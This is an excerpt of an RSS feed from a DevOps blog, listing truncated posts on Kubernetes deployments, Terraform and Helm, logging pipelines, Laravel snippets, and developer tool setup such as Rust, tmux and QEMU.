+      <title>Installing OmniDB in kubernetes as deployment resource</title>
+      <link>https://blog.wisekee.com/post/omnidb-installing/</link>
+      <pubDate>Wed, 20 Jan 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/omnidb-installing/</guid>
+      <description>
+        
+          
+            OmniDB is tool for unify the multiple type DataBase management,appropriate deploy in enterprise internal proxy access to other environment.
+fetch the Dockerfile in this url: OminDB Dockerfile Build the docker image docker build . -t dev.com/library/omnidb:latest then push the image to registry:docker push dev.com/library/omnidb:latest
+create the kubernetes deployment manifest file 1apiVersion: v1 2kind: PersistentVolumeClaim 3metadata: 4 name: omnidb-pvc 5spec: 6 accessModes: 7 - ReadWriteOnce 8 storageClassName: nfs-client 9 resources: 10 requests: 11 storage: 5Gi 12--- 13apiVersion: apps/v1 14kind: Deployment 15metadata: 16 name: omnidb-deployment 17 labels: 18 app: omnidb 19spec: 20 replicas: 1 21 selector: 22 matchLabels: 23 app: omnidb 24 template: 25 metadata: 26 labels: 27 app: omnidb 28 spec: 29 containers: 30 - name: omnidb 31 image: dev.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Installing eclipse-che in native kubernetes platform</title>
+      <link>https://blog.wisekee.com/post/installing-eclipse-che-in-kubernetes/</link>
+      <pubDate>Fri, 15 Jan 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/installing-eclipse-che-in-kubernetes/</guid>
+      <description>
+        
+          
+            At first installing OLM Requirement: kubectl configred and connect to Kubernetes cluster correct.
+1curl -L https://github.com/operator-framework/operator-lifecycle-manager/releases/download/v0.17.0/install.sh -o install.sh 2chmod +x install.sh 3./install.sh v0.17.0 Installing Eclipse-Che Operator According to: eclipse-che operator
+1kubectl create -f https://operatorhub.io/install/eclipse-che.yaml 2# view the Operator resources 3kubectl get pods --all-namespaces | grep olm 4# and the CluseterServiceVersion 5kubectl get csv -n my-eclipse-che Install Eclipse-che instance use CheCluster resource 1#The partial configure need to change 2 k8s: 3 ingressClass: &amp;#39;nginx&amp;#39; 4 ingressDomain: &amp;#39;che.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Kubernetes events collect to elasticsearch</title>
+      <link>https://blog.wisekee.com/post/kubernetes-events-to-es/</link>
+      <pubDate>Wed, 16 Dec 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/kubernetes-events-to-es/</guid>
+      <description>
+        
+          
+            We what collect and storage kubernetes events to elasticsearch, easy to query and analyze alerts. we use this github repo componentkubernetes-event-exporter
+The main.tf include kubernetes &amp;lsquo;deployment&amp;rsquo; object 1resource &amp;#34;kubernetes_deployment&amp;#34; &amp;#34;event_export&amp;#34; { 2 metadata { 3 name = &amp;#34;event-export&amp;#34; 4 namespace = &amp;#34;kube-system&amp;#34; 5 labels = { 6 app = &amp;#34;event-export&amp;#34; 7 } 8 } 9 10 spec { 11 replicas = 1 12 13 selector { 14 match_labels = { 15 app = &amp;#34;event-export&amp;#34; 16 } 17 } 18 19 template { 20 metadata { 21 labels = { 22 app = &amp;#34;event-export&amp;#34; 23 version = &amp;#34;v1&amp;#34; 24 } 25 } 26 27 spec { 28 service_account_name = kubernetes_service_account.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Terraform&#43;Helm release&#43;fluentd in kubernetes</title>
+      <link>https://blog.wisekee.com/post/terraform-helm-fluentd/</link>
+      <pubDate>Wed, 02 Dec 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/terraform-helm-fluentd/</guid>
+      <description>
+        
+          
+            step1 the main.tf include following contents: 1resource &amp;#34;helm_release&amp;#34; &amp;#34;fluentd_server&amp;#34; { 2 name = &amp;#34;fluentd-server&amp;#34; 3 repository = &amp;#34;https://charts.bitnami.com/bitnami&amp;#34; 4 # chart = &amp;#34;${path.module}/../../../../../charts/fluentd&amp;#34; 5 version = &amp;#34;3.1.0&amp;#34; 6 namespace = &amp;#34;kube-system&amp;#34; 7 8 values = [ 9 &amp;lt;&amp;lt;-EOF 10 forwarder: 11 configMap: &amp;#34;fluentd-forwarder-config&amp;#34; 12 rbac: 13 pspEnabled: true 14 resources: 15 limits: 16 memory: 1Gi 17 requests: 18 memory: 512Mi 19 aggregator: 20 replicaCount: 1 21 configMap: &amp;#34;fluentd-elasticsearch-config&amp;#34; 22 resources: 23 limits: 24 memory: 1Gi 25 requests: 26 memory: 512Mi 27 extraEnv: 28 - name: ELASTICSEARCH_HOST 29 value: &amp;#34;${var.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Getting started Serverless framework Nuclio</title>
+      <link>https://blog.wisekee.com/post/getting-stared-nucalio/</link>
+      <pubDate>Sun, 15 Nov 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/getting-stared-nucalio/</guid>
+      <description>
+        
+          
+            use Helm charts: Github 1	helm repo add nuclio https://nuclio.github.io/nuclio/charts 2	kubectl create namespace nuclio copy registry to nuclio namespace from existing namespace 1kubectl get secret repo-registry -n dev-ns -o yaml \ 2| sed s/&amp;#34;namespace: dev-ns&amp;#34;/&amp;#34;namespace: nuclio&amp;#34;/ \ 3| kubectl apply -f - install nuclio 1	helm install nuclio \ 2 --set registry.secretName=repo-registry \ 3 --set registry.pushPullUrl=localhost/nucalio \ 4 nuclio/nuclio -n nuclio visit dashboard 1	kubectl -n nuclio port-forward $(kubectl get pods -n nuclio -l nuclio.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Scheduler clean up kubernetes unuseful resources</title>
+      <link>https://blog.wisekee.com/post/schedule-cleanup-k8s-resources/</link>
+      <pubDate>Mon, 02 Nov 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/schedule-cleanup-k8s-resources/</guid>
+      <description>
+        
+          
+            Prepare Golang program code use clean up unused pods and replicaset resources in kubernetes we can clean up not running status pods and deactive replicasets
+initialization Go lanugage project evnironment 1	mkdir k8s_res_cleanup &amp;amp;&amp;amp; cd k8s_res_cleanup 2	go mod init example.com/cleanup/resources 3	go get -v -u k8s.io/client-go@v0.18.2 # install packages 4	go get -v -u github.com/prometheus/common@v0.1.0 create sub packageconfig/k8s.go indicate how can connect to kubernetes cluster 1package config 2 3import ( 4	&amp;#34;flag&amp;#34; 5	logs &amp;#34;github.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Solve the problem of Metrics - Server</title>
+      <link>https://blog.wisekee.com/post/k8s-metrics-server/</link>
+      <pubDate>Sun, 25 Oct 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/k8s-metrics-server/</guid>
+      <description>
+        
+          
+            When we repeatedly install the Metrics-Server, because we use helm to install it, deleting one of them will cause the following error when executing the command related to kubectl top nodes: Error from server (NotFound): the server could not find the requested resource (get services http:heapster:)
+A large part of this is due to the removal of the Apiservice Resources from Metics, when you execute the following command to ensure that the Apiservice exists kubectl get apiservice | grep metrics v1beta1.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Notes for using Kubernetes Ingress Controller</title>
+      <link>https://blog.wisekee.com/post/kubernetes-ingress-guides/</link>
+      <pubDate>Thu, 15 Oct 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/kubernetes-ingress-guides/</guid>
+      <description>
+        
+          
+            Append the nginx ingress http redirect to https Add extra port to nginx deployment for example: 8080, look like following 1ports: 2 - name: http 3 containerPort: 80 4 protocol: TCP 5 - name: https 6 containerPort: 443 7 protocol: TCP 8 - name: webhook 9 containerPort: 8443 10 protocol: TCP 11 - name: http-redirect 12 containerPort: 8080 Add section http-snippet to ConfigMap ingress-nginx-controller 1data: 2 allow-snippet-annotations: &amp;#39;true&amp;#39; 3 compute-full-forwarded-for: &amp;#39;true&amp;#39; 4 use-forwarded-headers: &amp;#39;true&amp;#39; 5 server-tokens: &amp;#39;false&amp;#39; 6 http-snippet: | 7 server { 8 listen 8080; 9 return 308 https://$host$request_uri; 10 } Modify the ingress service loadbalance configure, let http-80 forward to http-redirect-8080 1- name: http 2 protocol: TCP 3 appProtocol: http 4 port: 80 5 targetPort: http-redirect 6 nodePort: 32009 Using Nginx-Ingress Controller in AWS Eks environment Need manually enable the Proxy protocol V2 in NLB target group just only TCP https 443 listener Rather than TCP http 80 listener Multiple SSL certificate need manually add to NLB The http redirect to https, need to change some paramets 1	# use http-snippet and open proxy protocol 2 use-proxy-protocol: &amp;#39;true&amp;#39; 3 use-forwarded-headers: &amp;#39;true&amp;#39; 4 server-tokens: &amp;#39;false&amp;#39; 5 http-snippet: | 6 server { 7 listen 8000; 8 return 308 https://$host$request_uri; 9 } 10 proxy-real-ip-cidr: ${join(&amp;#34;,&amp;#34;, var.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Airflow console logs display in kuberntes container executor</title>
+      <link>https://blog.wisekee.com/post/airflow-kuberntes-logs-config/</link>
+      <pubDate>Sun, 11 Oct 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/airflow-kuberntes-logs-config/</guid>
+      <description>
+        
+          
+            Problem description When use kubernetes executor in airflow, the dags not use the podOperator but that use PythonOperator, the console logs end of Running %s on host %s &amp;lt;TaskInstance:, then the task logs don&amp;rsquo;t redirect to stdout According to the Airflow descript need config the logging class: custom_log_settings Change the custom log settings comment relative code and enable to console the tee_file_task_handler.py edit the following code snippet.
+comment the following content.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Points to note about  Terraform helm provider</title>
+      <link>https://blog.wisekee.com/post/terraform-helm-issues/</link>
+      <pubDate>Sat, 10 Oct 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/terraform-helm-issues/</guid>
+      <description>
+        
+          
+            The Metrics-Server helm chart as Terraform HCL 1resource &amp;#34;helm_release&amp;#34; &amp;#34;metrics-server&amp;#34; { 2 name = &amp;#34;metrics-server&amp;#34; 3 repository = &amp;#34;https://charts.bitnami.com/bitnami&amp;#34; 4 chart = &amp;#34;metrics-server&amp;#34; 5 version = &amp;#34;4.1.4&amp;#34; 6 namespace = &amp;#34;kube-system&amp;#34; 7 8 set { 9 name = &amp;#34;extraArgs.kubelet-preferred-address-types&amp;#34; 10 value = &amp;#34;InternalIP\\,ExternalIP\\,Hostname&amp;#34; 11 } 12 13 set { 14 name = &amp;#34;resources.requests.memory&amp;#34; 15 value = &amp;#34;500Mi&amp;#34; 16 } 17 18 set { 19 name = &amp;#34;resources.limits.memory&amp;#34; 20 value = &amp;#34;1Gi&amp;#34; 21 } 22 23 set { 24 name = &amp;#34;apiService.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Backup and Restore kubernetes cluster using Velero</title>
+      <link>https://blog.wisekee.com/post/k8s-backup-restore-using-velero/</link>
+      <pubDate>Thu, 10 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/k8s-backup-restore-using-velero/</guid>
+      <description>
+        
+          
+            Installing or Upgrade Velero client on Mac OS:
+1	brew install velero 2	HOMEBREW_NO_AUTO_UPDATE=1 brew upgrade velero #upgrade to the latest version if maybe The Velero should use object store save the snapshot. so we use Minio as kubernetes object store.Minio launched as part of docker-compose.yaml
+1	minio: 2 container_name: &amp;#34;minio&amp;#34; 3 image: minio/minio 4 command: &amp;#34;server /data&amp;#34; 5 ports: 6 - &amp;#34;9000:9000&amp;#34; 7 environment: 8 MINIO_ACCESS_KEY: “xxxxxxx” 9 MINIO_SECRET_KEY: “xxxxxxx” 10 volumes: 11 - &amp;#34;.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Custom private domain name in kubernetes cluster</title>
+      <link>https://blog.wisekee.com/post/custom-domain-name-in-k8s/</link>
+      <pubDate>Thu, 03 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/custom-domain-name-in-k8s/</guid>
+      <description>
+        
+          
+            We use default service domain name ${servicename}.${namespace}.svc.cluster.localin kubernetes cluster, however the custom private domain name in private k8s networks frequently used. we can use coredns component reparse the private domain name to default CNAME.
+change coredns configmap add custom domain name config to yaml kubectl edit cm coredns -n kube-system
+1data: 2 Corefile: | 3 .:53 { 4 errors 5 health { 6 lameduck 5s 7 } 8 ready 9 kubernetes cluster.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Quickly debug AWS App locally use Localstack(AWS Mock in local)</title>
+      <link>https://blog.wisekee.com/post/aws-local-development/</link>
+      <pubDate>Tue, 01 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-local-development/</guid>
+      <description>
+        
+          
+            When you develop components locally that rely on AWS, it can be cumbersome to configure authentication information, and sometimes network latency. It is important to mock with a native AWS component, which can:localstack I&amp;rsquo;m using Docker-Compose here to start a set of tools that local development depends on：
+The docker-compose.yml looks like this following 1version: &amp;#39;3&amp;#39; 2 3services: 4 mongodb: 5 image: mongo:3.4.1 6 volumes: 7 - &amp;#39;./easymock/data/db:/data/db&amp;#39; 8 networks: 9 - easy-mock 10 ports: 11 - &amp;#34;27017:27017&amp;#34; 12 restart: always 13 container_name: mongodb 14 15 redis: 16 image: redis:4.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>kubernetes operations command summary</title>
+      <link>https://blog.wisekee.com/post/k8s-common-command-conclusion/</link>
+      <pubDate>Tue, 25 Aug 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/k8s-common-command-conclusion/</guid>
+      <description>
+        
+          
+            When we use the Kubernetes platform,has many commands is important:
+The k command is alias to kubectl
+label for nodes kubectl label nodes host02 disktype=ssd
+view local config for kubernetes context k config get-contexts
+switch context&amp;rsquo;s namespaces kubectl config set-context my-vsphere-cluster --namespace=helm-test
+force delete pod, sometimes the pod still terminating.
+k delete pods &amp;lt;pod&amp;gt; -n &amp;lt;namespace&amp;gt; --grace-period=0 --force
+get all resource in current kubernetes cluster
+k get all --all-namespaces
+view job logs
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Php file cache in project</title>
+      <link>https://blog.wisekee.com/post/laravel-librarys/</link>
+      <pubDate>Tue, 25 Aug 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/laravel-librarys/</guid>
+      <description>
+        
+          
+            use cache library out of laravel framework 1&amp;lt;?php 2 3namespace Company; 4 5 6use Illuminate\Cache\CacheManager; 7use Illuminate\Container\Container; 8use Illuminate\Filesystem\Filesystem; 9 10class FileCache { 11 12 13 private $cacheManager; 14 private $cache; 15 16 private function __construct() 17 { 18 $container = new Container(); 19 $container[&amp;#39;config&amp;#39;] = [ 20 &amp;#39;cache.default&amp;#39; =&amp;gt; &amp;#39;file&amp;#39;, 21 &amp;#39;cache.stores.file&amp;#39; =&amp;gt; [ 22 &amp;#39;driver&amp;#39; =&amp;gt; &amp;#39;file&amp;#39;, 23 &amp;#39;path&amp;#39; =&amp;gt; __DIR__ . &amp;#39;/../../../storage/framework/cache&amp;#39; 24 ] 25 ]; 26 27 $container[&amp;#39;files&amp;#39;] = new Filesystem(); 28 $this-&amp;gt;cacheManager = new CacheManager($container); 29 $this-&amp;gt;cache = $this-&amp;gt;cacheManager-&amp;gt;store(); 30 } 31 32 public static function rememberForever($key, callable $callBack) { 33 return (new static()) 34 -&amp;gt;cache 35 -&amp;gt;rememberForever($key, $callBack); 36 } 37} use file cache get AWS SecretsManager item 1&amp;lt;?
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Automatic generate kubernetes custom resources api go language code</title>
+      <link>https://blog.wisekee.com/post/generate-crds-api-k8s/</link>
+      <pubDate>Sat, 22 Aug 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/generate-crds-api-k8s/</guid>
+      <description>
+        
+          
+            Why does this article exist because when we use Kubesphere. the go client code need to use the client objects of K8s but dosen&amp;rsquo;t provider the s2ibinary object client code. https://github.com/kubesphere/s2ioperator/tree/master/pkg/client/clientset/versioned/typed/devops/v1alpha1
+Prepare directory structure and resource defination files The doc.go include content: 1// +k8s:deepcopy-gen=package,register 2// +k8s:defaulter-gen=TypeMeta 3// +groupName=devops.kubesphere.io 4package v1alpha1 The register.go main defination custom resources GroupName and GroupVersion 1package v1alpha1 2 3import ( 4 &amp;#34;k8s.io/apimachinery/pkg/runtime/schema&amp;#34; 5 &amp;#34;sigs.k8s.io/controller-runtime/pkg/scheme&amp;#34; 6) 7 8type CodeFramework string 9 10const ( 11 Ruby CodeFramework = &amp;#34;ruby&amp;#34; 12 Go CodeFramework = &amp;#34;go&amp;#34; 13 Java CodeFramework = &amp;#34;Java&amp;#34; 14 JavaTomcat CodeFramework = &amp;#34;JavaTomcat&amp;#34; 15 Nodejs CodeFramework = &amp;#34;Nodejs&amp;#34; 16 Python CodeFramework = &amp;#34;python&amp;#34; 17 GroupName string = &amp;#34;devops.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Install and setup cloud foundry in kubernetes cluster</title>
+      <link>https://blog.wisekee.com/post/setup-cloudfoundry-in-k8s/</link>
+      <pubDate>Thu, 20 Aug 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/setup-cloudfoundry-in-k8s/</guid>
+      <description>
+        
+          
+            First prepare the tools installation in host: Kind: https://kind.sigs.k8s.io/docs/user/quick-start/ Cf command: https://docs.cloudfoundry.org/cf-cli/install-go-cli.html HOMEBREW_NO_AUTO_UPDATE=1 brew install cloudfoundry/tap/cf-cli@6 or HOMEBREW_NO_AUTO_UPDATE=1 brew install cloudfoundry/tap/cf-cli@7 Kubectl command: https://kubernetes.io/docs/tasks/tools/install-kubectl/ Helm: https://helm.sh/docs/intro/install/ The Kind must definiation config.yml, refer to expose http(80) and https(443) ports to host machine, because the k8s cluster node ip is internal-ip created by Kind such as: 172.18.0.2
+1kind: Cluster 2apiVersion: kind.x-k8s.io/v1alpha4 3networking: 4 # WARNING: It is _strongly_ recommended that you keep this the default 5 # (127.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Laravel ip allowlist request filter middleware</title>
+      <link>https://blog.wisekee.com/post/laravel-php-snippets/</link>
+      <pubDate>Sat, 15 Aug 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/laravel-php-snippets/</guid>
+      <description>
+        
+          
+            Temporary ip allow list in PHP framework Laravel 1&amp;lt;?php 2 3namespace App\Http\Middleware; 4 5use Closure; 6use Illuminate\Http\Request; 7use Illuminate\Support\Facades\Cache; 8use Illuminate\Support\Facades\Log; 9use Symfony\Component\HttpFoundation\IpUtils; 10 11class IpAllowMiddleware 12{ 13 /** 14 * Handle an incoming request. 15 * 16 * @param \Illuminate\Http\Request $request 17 * @param \Closure $next 18 * @return mixed 19 */ 20 public function handle($request, Closure $next) 21 { 22 $this-&amp;gt;setTrustProxy(); 23 $clientIp = $request-&amp;gt;getClientIp(); 24 if (!$this-&amp;gt;compareOrigin($clientIp)) { 25 Log::warning(&amp;#34;The client ip is forbidden: &amp;#34; .
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Go language frequently used command notes</title>
+      <link>https://blog.wisekee.com/post/go-usually-commands/</link>
+      <pubDate>Wed, 11 Sep 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/go-usually-commands/</guid>
+      <description>
+        
+          
+            Global install go program(go version &amp;gt;=1.16.0) go install sigs.k8s.io/kind@v0.9.0 when go version is higher 1.12 should install godoc command go get golang.org/x/tools/cmd/godoc launch go docs services in local godoc -http=:6060 view go environment variables,inlude GO ROOT path go env fmt package Println docs go doc fmt Println initialization go modules, when reference sub directory straightway example.com/module/sub1/sub2 go mod init example.com/module delete packages go clean -i -v -x github.com/somepkg/go/simpleGitHub Add modules to current packages go mod edit -require github.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>ElasticSearch monitoring and  alert base on ElastAlert</title>
+      <link>https://blog.wisekee.com/post/elastalert-usage/</link>
+      <pubDate>Tue, 02 Jul 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/elastalert-usage/</guid>
+      <description>
+        
+          
+            Dynamically generate alarm rules and send email to relative people.based on a given parameter or configuration Elastalert
+The directory construct look following 1├── elastalert 2├── generate_rule.py 3├── param.json 4├── rules 5└── template You can also through pip install elastalert installing elastalert package. I&amp;rsquo;m going to use it directly here The templatedirectory store tpl file, use this template generate some rules file to rules directory. and used elastalert
+Configuration file param.json 1{ 2 &amp;#34;dev&amp;#34;: { 3 &amp;#34;public_config&amp;#34;: { 4 &amp;#34;run_every&amp;#34;: 5, 5 &amp;#34;buffer_time&amp;#34;: 15, 6 &amp;#34;es_host&amp;#34;: &amp;#34;dev.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>AWS networking security enhance</title>
+      <link>https://blog.wisekee.com/post/aws-network-secrutiy-enhance/</link>
+      <pubDate>Sun, 05 May 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-network-secrutiy-enhance/</guid>
+      <description>
+        
+          
+            Vpc network division According to the requirements of the product and the customer, the two services of the two types of subnets are isolated. For example, DBsubnet01 and DBsubnet02 are both internal private subnets and belong to different product segments. ​	The two major subnet types are the intranet and the extranet. The internal network goes to the NAT Gateway, and the external network goes to the Internet Gateway. Like: RDS, Redis, background services, etc.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Tmux common commands</title>
+      <link>https://blog.wisekee.com/post/tmux-getting-started/</link>
+      <pubDate>Sat, 02 Mar 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/tmux-getting-started/</guid>
+      <description>
+        
+          
+            tmux kill-session # kill all sessions tmux ls # list all sessions To enable Iterm2 to access the clipboard General -&amp;gt; Selection -&amp;gt; Applications in terminal may access clipboard The common commands 11. Create a new session: tmux new-session or tmux new -s &amp;lt;session-name&amp;gt; 22. Detach from a session: Ctrl + b followed by d 33. Attach to a session: tmux attach-session or tmux attach -t &amp;lt;session-name&amp;gt; 44. Switch between sessions: Ctrl + b followed by ( 55.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Filebeat and Logstash config</title>
+      <link>https://blog.wisekee.com/post/logstash_configure/</link>
+      <pubDate>Fri, 10 Aug 2018 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/logstash_configure/</guid>
+      <description>
+        
+          
+            The logs collect workflow Filebeat gather the file path log files then send to Logstash 5044 port The logstash receive and transform extract fields and send to Elasticsearch The Filebeat config file is: /etc/filebeat.yml installing the Filebeat script: 1#!/bin/bash 2FILEBEAT_NAME=filebeat-6.7.2-x86_64.rpm 3# install filebeat 4curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/${FILEBEAT_NAME} 5sudo rpm -vi ${FILEBEAT_NAME} &amp;amp;&amp;amp; sudo rm ${FILEBEAT_NAME} 6sudo chkconfig --add filebeat 7sudo chkconfig filebeat on 8sudo mv -f filebeat.yml /etc/filebeat/filebeat.yml 9sudo chown root:root /etc/filebeat/filebeat.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Configuration and Installing NFS on ubuntu</title>
+      <link>https://blog.wisekee.com/post/ubuntu-install-nfs/</link>
+      <pubDate>Fri, 02 Mar 2018 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/ubuntu-install-nfs/</guid>
+      <description>
+        
+          
+            1#updating the system and install nfs daemon 2sudo apt-get update 3sudo apt install nfs-kernel-server 4 5#view the relative info about NFS 6sudo cat /proc/fs/nfsd/versions 7cat /etc/default/nfs-kernel-server 8cat /etc/default/nfs-common 9 10#create and bind the NFS directory in host hard disk 11sudo mkdir -p /srv/nfs4/data1 12sudo mkdir -p /srv/nfs4/data2 13sudo mount --bind /data2/nfs /srv/nfs4/data1 14sudo mount --bind /data3/nfs /srv/nfs4/data2 15 16#let binds permanent effect 17sudo vi /etc/fstab 18/data1/nfs /srv/nfs4/data2 none bind 0 0 19/data2/nfs /srv/nfs4/data3 none bind 0 0 20 21sudo vi /etc/exports 22# add following content to the file 23/srv/nfs4 192.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Hugo usage issues summary</title>
+      <link>https://blog.wisekee.com/post/hugo-usage-issues/</link>
+      <pubDate>Wed, 16 Aug 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/hugo-usage-issues/</guid>
+      <description>
+        
+          
+            Update: 2021/10 when pull at other location or machine, the submodule settings is lost, need reinitialization the submodule, only exec following this command:
+1git submodule update --init --recursive Usage scene In my github repo initialize two repos
+One to storage Hugo sourcecode and markdown files And other one use release finaly site resources Has two folders themes and public as github submodes
+1 git submodule add https://github.com/don.chen/blog.github.io public 2 git submodule update --init and every time wited markdown article and execute
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Getting started LLM for workshop</title>
+      <link>https://blog.wisekee.com/post/llm-getting-started/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/llm-getting-started/</guid>
+      <description>
+        
+          
+            How to use the LLMs Prompt Engineering Retrieval Augmented Generation (RAG) Fine-tuning Training your own Foundation Model(FM) from scratch Vector databases Milvus Database for AI. Store Vectors, Images, Texts, Videos, etc. Use with LLMs/LangChain deeplake Knowledge Referred to as &amp;ldquo;prompts&amp;rdquo;. Designing a prompt is essentially how you “program” a large language model model Plugins can be “eyes and ears” for language models Using commands to instruct the model what you want to achieve, such as &amp;ldquo;Write&amp;rdquo;, &amp;ldquo;Classify&amp;rdquo;, &amp;ldquo;Summarize&amp;rdquo;, &amp;ldquo;Translate&amp;rdquo;, &amp;ldquo;Order&amp;rdquo; Foundation model (FM) – An AI model with a large number of parameters and trained on a massive amount of diverse data.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Getting started rust development</title>
+      <link>https://blog.wisekee.com/post/gettting-started-rust/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/gettting-started-rust/</guid>
+      <description>
+        
+          
+            The sample is: rustup doc in local
+Environment setup 1curl --proto &amp;#39;=https&amp;#39; --tlsv1.3 -sSf https://sh.rustup.rs | sh 2rustup component add rust-src rust-analyzer rust-analysis 3# update the rust binary 4rustup update 5# uninstall the rust and rustup self 6rustup self uninstall 7 8rustc -V 9cargo -V Basic commands 1rustc --version 2cargo --version 3 4# crate the cargo project 5cargo new exercise 6cd exercise 7cargo run 8 9# to fast check 10cargo check 11# build 12cargo build --release 13# to debug 14cargo run 15# to debug build 16cargo build 17# to fromat the code 18rustfmt .
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Kubernetes maintenance mode in nodes</title>
+      <link>https://blog.wisekee.com/post/k8s-taint-evict-cordon/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/k8s-taint-evict-cordon/</guid>
+      <description>
+        
+          
+            The steps Taint the node Cordon the node Evict pods Verify pod migration Drain the node Uncordon the node Traint the specific node 1# prevent new pods to schedule 2kubectl taint nodes node1 node.kubernetes.io/unreachable=&amp;#34;&amp;#34;:NoSchedule 3kubectl cordon node1 4# execute the upgrade or other maintenance 5# evict pods 6kubectl drain node1 --ignore-daemonsets --delete-emptydir-data --force 7# 8kubectl uncordon node1 9 10# verify the pods can schedule 11kubectl get pods -o wide --field-selector spec.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>KVM getting started</title>
+      <link>https://blog.wisekee.com/post/kvm-getting-started/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/kvm-getting-started/</guid>
+      <description>
+        
+          
+            Can use the prompt in ChatAI how to launch ubuntu linux x86_64 in mac os apple silicon use : qemu-system-x86_64
+QEMU in macos Basic QEMU 1 2# create the virtual disk image 3qemu-img create -f qcow2 ubuntu-x86.qcow2 20G 4 5# install the ubuntu os to virtual disk 6qemu-system-x86_64 \ 7-m 4G \ 8-smp 4 \ 9-machine q35,accel=tcg\ 10-cpu Broadwell \ 11-drive file=ubuntu-x86.qcow2,format=qcow2 \ 12-cdrom path/to/ubuntu-iso.iso \ 13-boot d \ 14-vga virtio \ 15-display default,show-cursor=on 16 17# launch the ubuntu linux from virtual disk 18qemu-system-x86_64 \ 19-m 4G \ 20-smp 4 \ 21-machine q35,accel=tcg \ 22-cpu Broadwell \ 23-drive file=ubuntu-x86.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Sonarqube recovery from failed</title>
+      <link>https://blog.wisekee.com/post/sonarquebe-recovery/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/sonarquebe-recovery/</guid>
+      <description>
+        
+          
+            The volumen prefere to EBS can speed up the scanning.
